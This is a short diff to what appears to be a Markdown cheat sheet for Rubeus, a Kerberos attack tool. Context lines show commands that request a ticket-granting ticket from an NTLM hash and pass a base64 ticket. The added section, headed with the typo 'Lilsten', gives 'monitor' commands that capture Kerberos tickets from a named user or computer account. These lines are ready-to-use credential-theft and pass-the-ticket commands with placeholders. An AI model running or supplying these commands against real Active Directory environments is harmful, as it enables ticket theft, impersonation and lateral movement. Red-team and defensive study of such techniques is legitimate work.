@@ -177,3 +177,8 @@ C:> Rubeus.exe asktgt /user:<username> /ntlm:<ntlm_rc4_key> /opsec /createnetonl
 ```powershell
 C:> Rubeus.exe ptt /ticket:<base64_TGT>
 ```
+#### Lilsten for Tickets from User or Computer
+```powershell
+C:> Rubeus.exe monitor /targetuser:<HOST>$ /interval:5 /nowrap
+C:> Rubeus.exe monitor /targetuser:<user> /interval:5 /nowrap
+```
